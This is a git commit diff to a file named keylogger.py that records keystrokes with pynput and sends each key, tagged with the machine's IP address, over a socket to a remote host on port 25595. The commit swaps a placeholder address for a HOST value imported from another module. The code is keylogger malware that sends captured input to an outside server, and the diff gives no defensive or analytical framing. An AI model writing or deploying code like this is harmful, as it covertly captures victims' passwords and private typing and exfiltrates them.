3d89c8f00c12c214e7ba605eae9b1fc06f0997e8
etheboi <123627006+etheboi@users.noreply.github.com>
2024-03-16 17:46:44 +0000

    Update keylogger.py

--- assets/keylogger/keylogger.py
+++ assets/keylogger/keylogger.py
@@ -1,12 +1,13 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import socket
+from ClientConnections import HOST
 
 hostname = socket.gethostname()
 ip = socket.gethostbyname(hostname)
 
 s = socket.socket()
-s.connect(("[CHANGE TO IP]", 25595))
+s.connect((HOST, 25595))
 
 def on_press(key):
     s.send(f"{ip} {key}".encode())
